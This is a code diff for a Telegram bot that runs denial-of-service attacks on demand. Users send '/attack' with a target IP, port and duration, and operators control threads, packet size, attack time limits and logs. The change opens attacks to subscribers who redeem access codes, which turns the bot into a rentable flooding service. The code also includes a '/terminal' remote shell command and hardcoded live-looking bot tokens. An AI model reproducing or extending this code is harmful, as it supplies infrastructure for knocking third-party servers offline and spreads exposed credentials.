@@ -21,7 +21,7 @@ redeem_codes_collection = db['redeem_codes']
 attack_logs_collection = db['user_attack_logs']
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7875735321:AAFjPrvaO1Gr2RM3dga_ypER8tKNz2OXo1U'
+TELEGRAM_BOT_TOKEN = '7787261970:AAG9Tp0V2m5-4CBuEWbpbvkux2jvbrg2Usw'
 ADMIN_USER_ID = 529691217
 COOLDOWN_PERIOD = timedelta(minutes=1) 
 user_last_attack_time = {} 
@@ -89,7 +89,7 @@ async def execute_terminal(update: Update, context: CallbackContext):
     if not context.args:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
-            text="⚠️ *Usage: /terminal <command>*",
+            text="🔰 *Usage: /terminal <command>*",
             parse_mode='Markdown'
         )
         return
@@ -158,7 +158,7 @@ async def execute_terminal(update: Update, context: CallbackContext):
 
         # Limit the output to 4000 characters to avoid Telegram message size limits
         if len(output) > 4000:
-            output = output[:4000] + "\n⚠️ Output truncated due to length."
+            output = output[:4000] + "\n🔰 Output truncated due to length."
 
         # Send the output back to the user, including the prompt
         await context.bot.send_message(
@@ -191,7 +191,7 @@ async def upload(update: Update, context: CallbackContext):
     if not update.message.reply_to_message or not update.message.reply_to_message.document:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
-            text="*⚠️ Please reply to a file message with /upload to process it.*",
+            text="*🔰 Please reply to a file message with /upload to process it.*",
             parse_mode='Markdown'
         )
         return
@@ -271,7 +271,7 @@ async def delete_file(update: Update, context: CallbackContext):
     if len(context.args) != 1:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
-            text="*⚠️ Usage: /delete <file_name>*",
+            text="*🔰 Usage: /delete <file_name>*",
             parse_mode='Markdown'
         )
         return
@@ -282,7 +282,7 @@ async def delete_file(update: Update, context: CallbackContext):
     if file_name in PROTECTED_FILES:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
-            text=f"⚠️ *File '{file_name}' is protected and cannot be deleted.*",
+            text=f"🔰 *File '{file_name}' is protected and cannot be deleted.*",
             parse_mode='Markdown'
         )
         return
@@ -297,7 +297,7 @@ async def delete_file(update: Update, context: CallbackContext):
     else:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
-            text=f"⚠️ *File '{file_name}' not found.*",
+            text=f"🔰 *File '{file_name}' not found.*",
             parse_mode='Markdown'
         )
         
@@ -308,9 +308,9 @@ async def help_command(update: Update, context: CallbackContext):
         # Help text for regular users (exclude sensitive commands)
         help_text = (
             "*Here are the commands you can use:* \n\n"
-            "*⚡ /start* - Start interacting with the bot.\n"
-            "*🚀 /attack* - Trigger an attack operation.\n"
-            "*💌 /redeem* - Redeem a code.\n"
+            "*🔸 /start* - Start interacting with the bot.\n"
+            "*🔸 /attack* - Trigger an attack operation.\n"
+            "*🔸 /redeem* - Redeem a code.\n"
         )
     else:
         # Help text for admins (include sensitive commands)
@@ -344,14 +344,15 @@ async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id 
 
-    # Check if the user is an admin
-    if user_id != ADMIN_USER_ID:
+    # Check if the user is allowed to use the bot
+    if not await is_user_allowed(user_id):
         await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
         return
 
     message = (
-        "*🔥 ıllıllı ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ÐȺƦʞᏔǝß ıllıllı 🔥*\n\n"
+         "*🔥 ıllıllı ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ÐȺƦʞᏔǝß ıllıllı 🔥*\n\n"
         "*Use 🖥️ /attack <ip> <port> <duration>*\n"
+        "💌/redeem - Redeem code"
         "*☄️ꜱᴇʀᴠᴇʀ ꜰʀᴇᴇᴢ ᴡɪᴛʜ @Demon_Rocky 🚀*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
@@ -363,7 +364,7 @@ async def add_user(update: Update, context: CallbackContext):
         return
 
     if len(context.args) != 2:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
         return
 
     target_user_id = int(context.args[0])
@@ -377,7 +378,7 @@ async def add_user(update: Update, context: CallbackContext):
         time_value = int(time_input[:-1])  # Get all but the last character and convert to int
         total_seconds = time_value * 60  # Convert minutes to seconds
     else:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
         return
 
     expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)  # Updated to use timezone-aware UTC
@@ -398,7 +399,7 @@ async def remove_user(update: Update, context: CallbackContext):
         return
 
     if len(context.args) != 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 Usage: /remove <user_id>*", parse_mode='Markdown')
         return
 
     target_user_id = int(context.args[0])
@@ -415,7 +416,7 @@ async def set_thread(update: Update, context: CallbackContext):
         return
 
     if len(context.args) != 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /thread <number of threads>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 Usage: /thread <number of threads>*", parse_mode='Markdown')
         return
 
     try:
@@ -432,7 +433,7 @@ async def set_thread(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Number of threads set to {threads}.*", parse_mode='Markdown')
 
     except ValueError as e:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*🔰 Error: {e}*", parse_mode='Markdown')
 
 async def set_byte(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
@@ -441,7 +442,7 @@ async def set_byte(update: Update, context: CallbackContext):
         return
 
     if len(context.args) != 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /byte <byte size>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 Usage: /byte <byte size>*", parse_mode='Markdown')
         return
 
     try:
@@ -458,7 +459,7 @@ async def set_byte(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Byte size set to {byte_size}.*", parse_mode='Markdown')
 
     except ValueError as e:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*🔰 Error: {e}*", parse_mode='Markdown')
 
 async def show_settings(update: Update, context: CallbackContext):
     # Only allow the admin to use this command
@@ -542,7 +543,7 @@ async def set_argument(update: Update, context: CallbackContext):
         return
 
     if len(context.args) != 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /argument <3|4|5>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 Usage: /argument <3|4|5>*", parse_mode='Markdown')
         return
 
     try:
@@ -560,7 +561,7 @@ async def set_argument(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Argument type set to {argument_type}.*", parse_mode='Markdown')
 
     except ValueError as e:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*🔰 Error: {e}*", parse_mode='Markdown')
 
 async def set_max_attack_time(update: Update, context: CallbackContext):
     """Command for the admin to set the maximum attack time allowed."""
@@ -570,7 +571,7 @@ async def set_max_attack_time(update: Update, context: CallbackContext):
         return
 
     if len(context.args) != 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /set_time <max time in seconds>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 Usage: /set_time <max time in seconds>*", parse_mode='Markdown')
         return
 
     try:
@@ -587,7 +588,7 @@ async def set_max_attack_time(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Maximum attack time set to {max_time} seconds.*", parse_mode='Markdown')
 
     except ValueError as e:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*🔰 Error: {e}*", parse_mode='Markdown')
 
 # Function to log user attack history
 async def log_attack(user_id, ip, port, duration):
@@ -604,38 +605,37 @@ async def log_attack(user_id, ip, port, duration):
 # Modify attack function to log attack history
 async def attack(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Getting the User ID
+    user_id = update.effective_user.id  # Get the ID of the user
     current_time = datetime.now(timezone.utc)
 
-    # Check if the user has permission to use the bot
-    if user_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You do not have permission to use this bot!*", parse_mode='Markdown')
+    # Check if the user is allowed to use the bot
+    if not await is_user_allowed(user_id):
+        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
         return
 
-    # Check for cooldown only if the user is not admin
-    if user_id != ADMIN_USER_ID:
-        last_attack_time = cooldown_dict.get(user_id)
-        if last_attack_time:
-            elapsed_time = current_time - last_attack_time
-            if elapsed_time < COOLDOWN_PERIOD:
-                remaining_time = COOLDOWN_PERIOD - elapsed_time
-                await context.bot.send_message(
-                    chat_id=chat_id, 
-                    text=f"*⏳ Please wait for {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.*", 
-                    parse_mode='Markdown'
-                )
-                return
+    # Check for cooldown
+    last_attack_time = cooldown_dict.get(user_id)
+    if last_attack_time:
+        elapsed_time = current_time - last_attack_time
+        if elapsed_time < COOLDOWN_PERIOD:
+            remaining_time = COOLDOWN_PERIOD - elapsed_time
+            await context.bot.send_message(
+                chat_id=chat_id, 
+                text=f"*⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.*", 
+                parse_mode='Markdown'
+            )
+            return
 
     args = context.args
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*☄️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🔰 Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
         return
 
     ip, port, duration = args
 
     # Validate IP prefix
     if not ip.startswith(valid_ip_prefixes):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid IP prefix. Only specific IP ranges are allowed.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🔰 Invalid IP prefix. Only specific IP ranges are allowed.*", parse_mode='Markdown')
         return
 
     # Check if the user has already attacked this IP and port combination
@@ -652,14 +652,14 @@ async def attack(update: Update, context: CallbackContext):
 
         # Check if the duration exceeds the maximum allowed attack time
         if duration > max_attack_time:
-            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Maximum attack duration is {max_attack_time} seconds. Please reduce the duration.*", parse_mode='Markdown')
+            await context.bot.send_message(chat_id=chat_id, text=f"*🔰 Maximum attack duration is {max_attack_time} seconds. Please reduce the duration.*", parse_mode='Markdown')
             return
 
     except ValueError:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be an integer representing seconds.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🔰 Duration must be an integer representing seconds.*", parse_mode='Markdown')
         return
 
-    # Attack logic as you implemented earlier
+    # Continue with the attack logic (already implemented in your code)
     argument_type = settings_collection.find_one({"setting": "argument_type"})
     argument_type = argument_type["value"] if argument_type else 3  # Default to 3 if not set
 
@@ -680,19 +680,19 @@ async def attack(update: Update, context: CallbackContext):
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
-        f"*⚔️ Attack initiated! ⚔️*\n"
-        f"*🎯 Target: {ip}:{port}*\n"
-        f"*🕒 Duration: {duration} seconds*\n"
-        f"*🔥•------» Let the battlefield ignite! «------•💥*"
+        f"*⚡ ÐȺƦʞᏔǝß 𐌀丅丅ɐcʞ ℓαυη¢ђє∂! ☠️*\n"
+        f"*🎯 ㄒαʀᎶǝㄒ: {ip}:{port}*\n"
+        f"*⌛ Duration: {duration} seconds*\n"
+        f"*🔰•------» 𝙻𝚎𝚝 𝚑𝚎 𝚋𝚊𝚝𝚝𝚕𝚎𝚏𝚒𝚎𝚕𝚍 𝚒𝚐𝚗𝚢𝚝𝚎! «------•☢️*"
     ), parse_mode='Markdown')
 
-    # Log the attack in the database
+    # Log the attack to the database
     await log_attack(user_id, ip, port, duration)
 
     # Run the attack using the appropriate command
     asyncio.create_task(run_attack(chat_id, attack_command, context))
 
-    # Update last attack time and record the IP and port
+    # Update the last attack time for the user and record the IP and port
     cooldown_dict[user_id] = current_time
     if user_id not in user_attack_history:
         user_attack_history[user_id] = set()
@@ -707,7 +707,7 @@ async def view_attack_log(update: Update, context: CallbackContext):
 
     # Ensure the correct number of arguments are provided
     if len(context.args) < 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /log <user_id>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 Usage: /log <user_id>*", parse_mode='Markdown')
         return
 
     target_user_id = int(context.args[0])
@@ -715,7 +715,7 @@ async def view_attack_log(update: Update, context: CallbackContext):
     # Retrieve attack logs for the user
     attack_logs = attack_logs_collection.find({"user_id": target_user_id})
     if attack_logs_collection.count_documents({"user_id": target_user_id}) == 0:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No attack history found for this user.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 No attack history found for this user.*", parse_mode='Markdown')
         return
 
     # Display the logs in a formatted way
@@ -744,7 +744,7 @@ async def delete_attack_log(update: Update, context: CallbackContext):
 
     # Ensure the correct number of arguments are provided
     if len(context.args) < 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /delete_log <user_id>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 Usage: /delete_log <user_id>*", parse_mode='Markdown')
         return
 
     target_user_id = int(context.args[0])
@@ -755,7 +755,7 @@ async def delete_attack_log(update: Update, context: CallbackContext):
     if result.deleted_count > 0:
         await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Deleted {result.deleted_count} attack log(s) for user {target_user_id}.*", parse_mode='Markdown')
     else:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No attack history found for this user to delete.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 No attack history found for this user to delete.*", parse_mode='Markdown')
 
 
 async def run_attack(chat_id, attack_command, context):
@@ -789,7 +789,7 @@ async def generate_redeem_code(update: Update, context: CallbackContext):
     if len(context.args) < 1:
         await context.bot.send_message(
             chat_id=update.effective_chat.id, 
-            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
+            text="*🔰 Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
             parse_mode='Markdown'
         )
         return
@@ -813,7 +813,7 @@ async def generate_redeem_code(update: Update, context: CallbackContext):
     if time_input is None or time_input[-1].lower() not in ['d', 'm']:
         await context.bot.send_message(
             chat_id=update.effective_chat.id, 
-            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
+            text="*🔰 Please specify time in days (d) or minutes (m).*", 
             parse_mode='Markdown'
         )
         return
@@ -835,7 +835,7 @@ async def generate_redeem_code(update: Update, context: CallbackContext):
         except ValueError:
             await context.bot.send_message(
                 chat_id=update.effective_chat.id, 
-                text="*⚠️ Please provide a valid number for max uses.*", 
+                text="*🔰 Please provide a valid number for max uses.*", 
                 parse_mode='Markdown'
             )
             return
@@ -869,7 +869,7 @@ async def redeem_code(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
 
     if len(context.args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🔰 Usage: /redeem <code>*", parse_mode='Markdown')
         return
 
     code = context.args[0]
@@ -938,7 +938,7 @@ async def delete_code(update: Update, context: CallbackContext):
         else:
             await context.bot.send_message(
                 chat_id=update.effective_chat.id, 
-                text=f"*⚠️ Code `{specific_code}` not found.*", 
+                text=f"*🔰 Code `{specific_code}` not found.*", 
                 parse_mode='Markdown'
             )
     else:
@@ -955,7 +955,7 @@ async def delete_code(update: Update, context: CallbackContext):
         else:
             await context.bot.send_message(
                 chat_id=update.effective_chat.id, 
-                text="*⚠️ No expired codes found to delete.*", 
+                text="*🔰 No expired codes found to delete.*", 
                 parse_mode='Markdown'
             )
 
@@ -968,7 +968,7 @@ async def list_codes(update: Update, context: CallbackContext):
 
     # Check if there are any documents in the collection
     if redeem_codes_collection.count_documents({}) == 0:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No redeem codes found.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 No redeem codes found.*", parse_mode='Markdown')
         return
 
     # Retrieve all codes
@@ -1039,7 +1039,7 @@ async def cleanup(update: Update, context: CallbackContext):
     expired_users_list = list(expired_users)  # Convert cursor to list
 
     if len(expired_users_list) == 0:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No expired users found.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*🔰 No expired users found.*", parse_mode='Markdown')
         return
 
     # Remove expired users from the database
